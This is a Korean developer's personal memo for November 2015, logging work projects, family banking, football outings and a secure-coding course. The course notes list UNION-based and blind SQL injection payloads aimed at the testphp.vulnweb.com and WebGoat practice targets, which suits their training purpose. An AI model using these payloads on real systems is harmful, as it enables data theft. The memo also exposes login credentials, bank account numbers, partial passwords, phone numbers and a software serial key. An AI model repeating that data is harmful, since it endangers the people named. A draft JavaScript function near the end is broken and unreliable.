 

■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
+---------------------------------------------// Memo(2015.11) //----------------------------------------------------------+
■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■


■■■■■■■■■■■■■■■■■■ 2015.11.01(일) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 20:40 ==> 

▦ 조기축구
06:00 기상
06:20 버스(6411번, 대림역 -> 학동역)
07:20 신구초등학교
07:20 신사조기회 창립 기념식 준비
08:00 종로 석탄공사 지하1층(영민이형 가게: 영민이형이랑 같이 고기 가지러 감) 
08:20 도착
09:00 게임 ==> 1게임 함(2게임때 양발에 쥐가 나서 교체함)
10:00 제 35회 신사조기회 창립 기념식(교장 축사) ==> 용길이 결혼 청첩장 가지고 옴(11월 22일 14시 천안)
       --> 창원이형(회장) 형수, 수인이형 형수, 정욱이형 형수
       --> 병춘이형(감독)이 캐논 카메라 가지고 와서 촬영해서 밴드에 올림
12:50 상요형이 막걸리 안 사준다고 영민이형이랑 싸움
16:00 종료
17:20 귀가(다리 아퍼서 계속 누워 있었음) 
19:40 석식
22:30 취침
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.02(월) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 17:00 ==> 철수

- 한섬 ERP 재구축 Prj[★]
1. SW 기술 경력서 확인서 사인 받음(LG CNS 박재완 부장)
2. 근무내역서 사인 받음(LG CNS 박재완 부장)
3. 인수인계
 1) LG CNS 최용복 사원(010-4333-6170: 메일: archichoi86@lgcns.com)
4. SW 기술 경력서 제출(KOSA 방문: 학동역 2번 출구 갔다옴)
5. 노트북 포맷 요청(14시, 이용섭 주임)
6. 기업은행 방문 예금, 적금 상담
7. 노트북 포맷 받음(17시): D 드라이브 없어서 그나마 빨리 끝남
8. 프로그램 실적현황2은 단계가 2개 이상에서 여러 건이 조회되는 현상에 대해 이번주까지 처리해주기로 함
9. 철수(17시)
==============================================================================================================

- 기업은행 방문 예금, 적금 상담
1. 사랑나눔적금(예금 없음) 판매 중
 1) 최대 월 50만원으로 천만원까지 가능 ==> 1년 ~ 2년 : 4.9%, 2년 이상: 5.1%
 2) 가족관계 증명서 지참
----------------------------------------------------------------------------------------------------------

- 다문화가정 저축 가입
1.  기업은행 신서민섬김 통장, 연 7%, 최대 예금 500만,(1년, 아내)  ==> 가입함 가입함(연 6.55%, 2년): 2013년 10월 21일(월)
 1) 위치: 기업은행 서울대역지점(서울입구역 4번 출구: 서울 관악구 봉천동 875-7번지)
==============================================================================================================

- 우리은행 방문 예금, 적금 상담
1. 사희망드림 통장 적금 판매 중
 1) 최대 월 30만원으로 천만원까지 가능 ==> 1년: 4%
 2) 가족관계 증명서 지참
----------------------------------------------------------------------------------------------------------

- 우리은행 적금 만기(찾기)
- [우리은행] 희망드림 통장 적금 가입 ==> 2014.11.07(금) @@@@@@
1. 계좌번호: 1040-409-851432(1040409851432), 예금주: DINH THI ＬUYEN, pwd: 05*8*1
2. 금리: 연 7.5% 수익(기본: 4% + 우대: 3.5%), 서울대입구역지점(서울입구역 4번 출구)
3. 계약금액: 3,046,250(세전) ==> 300만원 입금(2달 안 넣음), 4. 계약기간: 1년(월 30만원 한도) 
5. 만기일: 2015.11.07
 ==> 우리직장인재테크통장에서 매월 이체됨 @@@
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.03(화) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★]
1. 의황 현대차 GQMS 3.0 Pro(의왕역 2번 출구) - XPlatform 공통(2.5개월)
 1) 위치: 경기도 의왕시 의왕역 2번 출구)
2. 프로젝트 인력 
 0) 이산하 팀장(010-5795-3344, (주)투비소프트, 영업대표)  
 0) 이지애 과장(현대 오토 에버, 고객 PM)  
 1) 이성관 이사(010-3555-2219, (주)CSPI, PM) 
 2) 황정환 사원(0106456-8905, (주)CSPI, 정직원)   
3. 기타
 1) 기존 GQMS 업데이트
 2) 12월 26일 오픈
 3) 서문에서 출입 등록이 안되어 있어서 걸어서 정문으로 감
 4) PC는 자체 PC 사용(노트북 다시 가지고 옴)
==============================================================================================================

- 로그인 정보  ==> VDI, SAC, DB Safer
1. H1510145 / asas1212@ 
 ==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.04(수) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
1. DB Safer 계정이 등록 안되어서 할 수 있는 일 없었음
2. 사번: H1510145 / asas1212@ 
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.05(목) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
1. DB Safer 계정이 등록 안되어서 할 수 있는 일 없었음
==============================================================================================================
 
■■■■■■■■■■■■■■■■■■ 2015.11.06(금) 작업 ■■■■■■■■■■■■■■■
---> 09:00 ~ 17:30 ==>  

- 해킹 방어를 위한 보안코딩 실무 교육[★]
- 위협모델링 실습(http://demo.testfire.net) 
http://demo.testfire.net
http://cve.mitre.org
http://www.owasp.org 
http://www.3shools.com/sql/sql_union.php
==============================================================================================================

- KISA 시큐어 코딩교육 일정 
1. 과 정 명: 해킹방어를 위한 보안코딩 실무
2. 차     수: 20차
       ※ 교육시작 최소 10분전에 교육장에 입장 완료해 주시기 바랍니다. 
3. 강     사: 공대룡/이은진 강사
4. 담 당 자: 현대오토에버 동반성장팀 김봉기 과장  (TEL 02-6296-4134/ EMAIL slayer93@hyundai-autoever.com)
5. 장     소: 서울특별시 영등포구 당산로 41길 11, E동 5층(당산로4가 당산 SKV1 센터) 교육장 (첨부의 지도 참조)
6. 준 비 물: 노트북, 필기구 (강의실에 PC가 준비되어 있지 않으므로 노트북은 반드시 지참해 주십시오)
7. 중     식: 중식은 제공해 드리지 않습니다.
8. 이수증 교부 : 이수증은 해당 차수의 다음주 수요일 이후에 교부됩니다.

※ 교육과정을 수료하시면 이수증이 교부되며, 이 이수증은 보안자격 취득여부를 판단하는 근거자료가 될 수 있으니 참고 바랍니다.
※ 결석하시게 되면 차후 재신청을 받지 않습니다. 따라서 보안자격을 취득하시려면 개인적으로 별도 교육을 받으셔야 합니다. 
※ 20차 : 2015.11.06(금) ~ 07(토), 09:00 ~ 20:00 (10H)
==============================================================================================================

- SCAN-RAY 실행
1. administrator / admin1234
==============================================================================================================

-SQL Injection - union 기반 테스트
http://testphp.vulnweb.com/
http://testphp.vulnweb.com/listproducts.php?cat=1
http://testphp.vulnweb.com/listproducts.php?cat=1 union all SELECT null, null, null, null, null, null, null, null, null, null, null#
http://testphp.vulnweb.com/listproducts.php?cat=1 union all SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11#
 
http://testphp.vulnweb.com/listproducts.php?cat=1 union all SELECT 1, user(), 3, 4, 5, 6, 7, 8, 9, 10, 11#
 
http://testphp.vulnweb.com/listproducts.php?cat=1 union all SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7, 8, 9, 10, 11 
rom information_schema.tables where table_schema=database()#
 
http://testphp.vulnweb.com/listproducts.php?cat=1 union all SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7, 8, 9, 10, 11
from information_schema.columns where table_name='users'#

http://testphp.vulnweb.com/listproducts.php?cat=1 union all SELECT 1, 2, 3, 4, 5, 6, uname, 8, 9, 10, 11 
from information_schema.columns where users#

http://testphp.vulnweb.com/listproducts.php?cat=1 union all SELECT 1, pass, 3, 4, 5, 6, 7, 8, 9, 10, 11 
from information_schema.columns where users#

http://testphp.vulnweb.com/login.php
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.05(토) 작업 ■■■■■■■■■■■■■■■
---> 09:00 ~ 17:30 ==>  

- 해킹 방어를 위한 보안코딩 실무 교육[★] 
- 위협모델링 실습(http://demo.testfire.net)
사이트 구조기능위협 
http://demo.testfire.net
==============================================================================================================

- 보안 취약 사이트 테스트
http://localhost:8080/WebGoat/attack  --> guest / gust
http://localhost:8080/WebGoat/attack?Screen=13&menu=1100  
http://localhost:8080/WebGoat/attack?Screen=13&menu=1100 AND ( SELECT ASCII(SUBSTR(name, 1, 1)) FROM pins 
WHERE cc_number=4321432143214321)  = 74  --
http://www.asciitable.com/
==============================================================================================================

- 네이버 보안 카페
cafe.naver.com/sec
------------------------------------------------------------------------------------------------------------------------

- 명령어 인젝션 실습
http://aspnet.testsparker.com 
http://www.domxssscanner.com/scan?url=http%3A%2F%2Fdemo.testfire.net 
http://localhost:8080/crlf.jsp?name=aaa 
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.08(일) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 20:40 ==> 여의도 원정

▦ 조기축구
04:00 기상(비 많이 옴)
04:10 진척관리 마무리(실적현황2 수정 작업) 
07:10 대림 문영APT 앞(태훈이형 차)
07:50 국회의사당 운동장(북문 ==> 주차장에 주차): 비 조금 옴
09:00 신사, 도곡, 아현 조기회 도착
09:20 게임 ==> 3게임 함(3게임은 1시간 정도 함): 아현에서 밥 준비해서 먹음
14:20 종료
15:30 귀가
19:40 석식
22:30 취침
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.09(월) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
1. DB Safer 연결(eclipse 셋팅)
2. 이도경(투입 근무 경험) 차장, 김소담(신혼여행) 대리 투입
==============================================================================================================

- 진척관리 마무리(05시)
1. 프로그램 실적현황2은 단계가 2개 이상에서 여러 건이 조회되는 현상 처리 하여 LG CNS 최용복 사원에서 
메일로 보냄.(저번주 새벽 4시에 일어나서 작업함)
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.10(화) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★]  
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.11(수) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==> 출입증 나옴

- 현대 오토 에버 GQMS 3.0 Prj[★]  
==============================================================================================================
 
■■■■■■■■■■■■■■■■■■ 2015.11.12(목) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==> 출입증 나옴

- 현대 오토 에버 GQMS 3.0 Prj[★]  
==============================================================================================================

- USB 미니 선풍기 구입
[강원전자] USB 휴대용 미니선풍기 대: G마켓
http://item2.gmarket.co.kr/Item/detailview/Item.aspx?goodscode=550772634
==============================================================================================================

- [우리은행] 희망드림 통장 적금 해약 ==> 2015.11.12(목) 해약   @@@
1. 거래일시: 2015.11.12(목), 거래명: 만기해지, 취급자: 조선희
2. 계좌번호: 1040-409-851432, 받으실 분: 딘티루옌, 수수료: 3,000원
3. 금액
 1) 원금: 3,000,000원, 이자 금액: 109,294원(7.5%)
 2) 세금 차감 후 이자: 3,100,296원
 3) 타행송금: SC은행 130-20-502841, 예금주: 진태만 3,100,296원 송금 처리함
--------------------------------------------------------------------------------------------------------

- [우리은행] 희망드림 통장 적금 가입 ==> 2014.11.07(금) @@@@@@
1. 계좌번호: 1040-409-851432(1040409851432), 예금주: DINH THI ＬUYEN
2. 금리: 연 7.5% 수익(기본: 4% + 우대: 3.5%), 서울대입구역지점(서울입구역 4번 출구)
3. 계약금액: 3,046,250( 세전 ==> 300만원 입금(2달 안 넣음), 4. 계약기간: 1년(월 30만원 한도) 
 ==> 우리직장인재테크통장에서 매월 이체됨 @@@
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.13(금) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★]
==============================================================================================================

- 신사조기회 다음 카페 개편
1. 메인 대문 수정 ==> http://cafe.daum.net/shinsasoccer
2. 신사조기회 다음 카페에 사진 올리기
==============================================================================================================

- 용길이 부주 확인
1. 내 결혼식에 부주 안함, 수종 돌잔치에서 5만원 보냄(불참)
2. 결혼식에 5만원 보낼 것(불참)   
==============================================================================================================
 
■■■■■■■■■■■■■■■■■■ 2015.11.14(토) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==> 비옴, 루옌 부채춤 공연(수종 돌봄)  

- 시럽페이 등록(간편결제 시스템)
1. 결제 PIN 비밀번호: 52**0*
2. tamario@naver.com / hp수종12**
==============================================================================================================

- [수면조끼증정] 하기스 보송보송 팬티 5단계31매X4팩, 가격: 33,020원(개당 266원) ==> 11번가
http://www.11st.co.kr/product/SellerProductDetail.tmall?method=getSellerProductDetail&prdNo=1385544981&xfrom=&xzone=
==============================================================================================================
 
■■■■■■■■■■■■■■■■■■ 2015.11.15(일) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 20:40 ==>  

- 묘사  
05:30 기상 
05:50 집 출발
06:00 구로디지털단지 환승센터(5627번 버스 탑승)
06:30 광명역(동편, 4번 타는 곳): 6호차[다음부터 포항가는 기차는 11호차 탈 것]
07:07 KTX 탑승(포항행) ==> 영화 다운받아서 암살 시청
09:20 포항역 도착
09:30 택시(포항역 --> 포항집): 6,600원
09:50 포항집 도착
10:00 묘사 준바(상 차리기)
10:30 대규 새 엄마, 대규 처 도착
12:20 묘사 ==> 시사 조문 쓰기 사진 촬영(내년에는 보고 쓸 것), 묘사와 고성 벌초 문제 논의
	작은 아버지, 종욱이 아제, 대규, 일생이 아제(처음 참석, 삐져서 일찍 감), 병엽이 아제(속모)
	병일이 아제(숙모), 병일이 아제 아들
	판섭이 고모(고모부), 옥욱이 고모(고모부), 만주 고모
13:00 묘사 종료
13:20 식사 
15:30 종료
15:50 집출발(포항집 -> 유성여고)
16:30 유성여고 입구 정류장
16:40 포항역
17:00 KTX 탑승
19:25 광명역
19:40 광명역 버스 정류장
20:10 구로디지털단지 환승센터
20:20 귀가
00:20 취침  
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.16(월) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
1. 메인 작업
==============================================================================================================

- 내방 정리
1. 책꽃이 정리
2. 거실 수종 책꽃이 만들기
==============================================================================================================

- 알파스캔 모니터 받침대 확인
==============================================================================================================

- [기업은행] 신서민섬김 예금 만기 해약 ==> 2015.11.16(월) 해약   @@@
1. 거래일시:  2015.11.16(월), 거래명: 만기해지, 취급자: 김현경
2. 계좌번호: 037403-04-019218, 받으실 분: 딘티루옌, 수수료: 3,000원
3. 금액
 1) 원금: 5,000,000원, 이자 금액: 657,404(6.55%)
 2) 세금 차감 후 이자: 5,556,174원
 3) 타행송금: SC은행 130-20-502841, 예금주: 진태만 5,553,174원 송금 처리함
--------------------------------------------------------------------------------------------------------

- 기업은행 예금 찾기(루옌 혼자 감)
- 기업은행 구로삼성IT지점 @@@@
http://map.naver.com/local/siteview.nhn?code=13130115  
1. 기업은행 신서민섬김 예금 만기 해약 요청(원금: 500만 원, 가족관계 증명서 지참)
2. 만기 적금 찾아서 SC은행(130-20-502841, 예금주: 진태만)에 송금 요청
3. 기업은행 신서민섬김 적금 신규 가입(연 6.55%, 2년, 월 50만원) 
4, 기업은행 루옌 보통 통장에서 매월 25일 자동 이체 설정
5. 문제가 있으면 딘티루옌 남편(010-3072-0898)에게 전화 요망
--------------------------------------------------------------------------------------------------------
  
- [기업은행] 신서민섬김 예금 만기 해약 요청  ==> 가입일: 2013.10.21(월) @@@
1. 계좌번호: 037403-04-019218(03740304019218), 예금주: 딘티루옌, pwd: 
2. 금리: 연 6.55% 수익(기본: 2.5% + 우대: 4%), 서울대입구역지점(서울입구역 4번 출구)
3. 계약금액: 5,655,000(세전), 계약금액2: 5,554,130(세후), 4. 계약기간: 2년(500만원 예치)
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.17(화) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==> 델 노트북 케이블 루옌이 찾음(5만원 줌, 토요일 큰누나에게 택배로 부칠 것)

- 현대 오토 에버 GQMS 3.0 Prj[★] 
1. 메인 작업
==============================================================================================================
  
■■■■■■■■■■■■■■■■■■ 2015.11.18(수) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
1. 메인 작업
==============================================================================================================
  
■■■■■■■■■■■■■■■■■■ 2015.11.19(수 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==> 평촌역(19:30, 사장님, 김현욱 선배랑 술(삼겹살, 맥주))

- 현대 오토 에버 GQMS 3.0 Prj[★] 
1. 메인 작업
==============================================================================================================
  
■■■■■■■■■■■■■■■■■■ 2015.11.20(금) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
1. 메인 작업
==============================================================================================================

- 패킷 분석기
1. http analyzer ==>  http://parkcla.tistory.com/6
 1) SN: 88386-501C9971CB4B8592
==============================================================================================================
  
■■■■■■■■■■■■■■■■■■ 2015.11.21(금) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 18:00 ==> 루옌 부채춤 공연(수종 돌봄)  
 
- 공기 청정기 구입 검토
1. LG 대리점, 삼성 대리점, 이마트 방문하여 검토
 1) 렌탈도 고민해볼 것(2 ~ 3만원 선) ==> 보류
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.22(일) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 20:40 ==>  

▦ 조기축구
04:00 기상
04:10 keep alive 분석 정리
07:00 집 출발
07:30 서울대입구역(8번 출구, 태훈이형 차)
08:20 광나루 한강공원 축구장(맨땅, 이현팀)
08:50 숏게임
09:20 게임 ==> 3게임 함(이현팀)
	==> 정홍이 2게임하고 일찍 용길이 결혼식 감: 용길이 결혼식 부주 5만원 정홍이에게 부탁 
12:00 종료
12:30 류명국 해장국(부대찌게: 9천원 냄)
14:00 종료
15:00 귀가
15:30 낮잠
17:30 기상
19:30 택배 보내기(큰누나[포항],  DELL 노트북, 6.3kg): 편의점 택배
19:50 석식(자짱면 2개, 테이크아웃): 남구로시장(왕짜장)
20:50 이발, 염색 ==> 루옌이 해줌
22:30 취침 
==============================================================================================================

- keep alive 분석
1. 현대 오토에버 품질시스템팀 이지애 과장에게 메일로 보냄
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.23(월) 작업 ■■■■■■■■■■■■■■■
---> 07:20 ~ 18:30 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
-  메인 작업
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.24(화) 작업 ■■■■■■■■■■■■■■■
---> 07:20 ~ 18:30 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
- 세계시간 수정 작업
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.25(수) 작업 ■■■■■■■■■■■■■■■
---> 07:20 ~ 18:30 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
- 메인 수정
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.26(목) 작업 ■■■■■■■■■■■■■■■
---> 07:20 ~ 18:30 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
- 즐겨찾기 수정
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.27(금) 작업 ■■■■■■■■■■■■■■
---> 07:20 ~ 18:00 ==> 현대차 통큰 버스(의왕 -> 구로디지털단지 정류장): 처음 탐

- 현대 오토 에버 GQMS 3.0 Prj[★] 
- 즐겨찾기 수정
==============================================================================================================

/*****************************************************************************************
* 함 수 명 : fn_init()
* 설 명 : 시간 Static 동적 생성 처리 함수 
*****************************************************************************************/ 
function fn_init() 
{
	trace("[/TEST.xfdl] [fn_init()] ==> [TEST_01] [ds_corP.getRowCount()]"+ ds_corP.getRowCount() );
	 
	var k =1;
	var nLeft = 0; 
	var nTop = 0;
	var nRight= 0; 
	var nBottom = 0; 
 	var nDeprtReceiverCnt = ds_corP.getRowCount();
	var nDeprtReceiverLoopCnt = 0;
  
	for(var i = 0; i < nDeprtReceiverLoopCnt; i++) 
	{    
		var objStcDeprtReceiver= new Static("sta_deprtReceiver_"+i, nLeft, nTop, nRight, nBottom);   // 01. 부서수신함 Static 동적 생성
		this.div_main.addChild("sta_deprtReceiver_"+i, objStcRegTime ); 

		objStcRegTime.class =  "sta_deprtReceiverBox";  
		objStcRegTime.background =  "transparent URL('images::sta_deprtReceiverBox')"; 
		objStcRegTime.border =  "0 none #808080"; 
		objStcRegTime.bordertype =  "round 5 5";  
		objStcRegTime.color =  "#f26c4f"; 
		objStcRegTime.align =  "left middle";
		objStcRegTime.font =  "Dotum,9,bold";
		objStcRegTime.padding =  "7 0 0 0"; 
		 objStcRegTime.text = " "+  s_corP.getColumn(i,"APPL_CNT"); // 건수 ==> 03 
		//objStcRegTime.text = "<fc v=#f26c4t'>"+ gfn_right('0'+ ds_corP.getColumn(i,"APPL_CNT") +"</fc>"; // 건수 ==> 03 (건)  
		objStcRegTime.show(); 
		trace("[/TEST.xfdl] [fn_init()] ==> [TEST_01] [objStcRegTime.text]"+ objStcRegTime.text );  
	}

	for(var i = 0; i < nDeprtReceiverLoopCnt; i++) 
	{ 
		div_main.scollbars = "autovert";   // 부서수신함 건수가 6이상이면 스크롤 바 생성
	}

}
==============================================================================================================
 
■■■■■■■■■■■■■■■■■■ 2015.11.28(토) 작업 ■■■■■■■■■■■■■■■
---> 07:20 ~ 18:30 ==>  

- 현대 오토 에버 GQMS 3.0 Prj[★] 
- 즐겨찾기 수정
==============================================================================================================

- 나눔동기 모임
06:00 기상
06:10 GQMS 3.0 Prj 작업
08:00 종료
11:50 중식
13:50  GQMS 3.0 Prj 작업
15:00 종료
15:10 집출발
15:20 대림역 --> 시청역
16:20 광화문
16:30 교보문고(상황 만남, 치아바타(햄버거): 회비 처리)
16:50 태용, 광석 만남
17:00 막내낙지(종로구): 맛이 없다고 함
18:00 이리오너라(종로, 술집) --> 종환, 호수 합류
19:00 이춘복 참치(종각, 참치 무한 리필: 인당 2만 4천원) --> 현용 합류
	==> 안건: 차기 총무 태용이가 하기로 함
23:30 종료 --> 상환 많이 취함
23:40 택시(종각 --> 동대문역사문화공원역 11번 출구)
23:50 호텔(케이팝호텔 동대문점) 체크인 ==> 투숙: 태용, 태만, 상환, 광석, 종환, 호수, 현용
00:10 펀비어킹(굿모닝시티점, 맥주집)
01:30 종료
01:40 GS25 편의점(칫솔(7개), 치약(2개), 커피)
01:50 이춘원이 뉴욕에서 전화 옴
02:00 취침 
==============================================================================================================

■■■■■■■■■■■■■■■■■■ 2015.11.29(일) 작업 ■■■■■■■■■■■■■■■
---> 07:00 ~ 20:40 ==>  

- 나눔동기 모임2
09:00 기상
09:10 조식(7층, 토스트, 우유, 음료수)
10:20 호텔 출발
10:30 DDP 구경
11:10 지하철(동대문역사문화공원역 -> 을지로4가역)
11:30 중식(우래옥, 평양냉면)
12:10 종료
12:20 지하철(을지로4가역 -> 대림역)
13:20 귀가
14:20 낮잠
17:20 기상
19:40 석식
23:20 추침
==============================================================================================================
 
■■■■■■■■■■■■■■■■■■ 2015.11.30(월) 작업 ■■■■■■■■■■■■■■■
---> 07:20 ~ 18:30 ==> CSPI 이성관 이사가 개발 코딩까지 참견해서 싸움

- 현대 오토 에버 GQMS 3.0 Prj[★] 
- 즐겨찾기 수정
==============================================================================================================
■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
+--------------------------------------------------------// End //--------------------------------------------------------+
■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■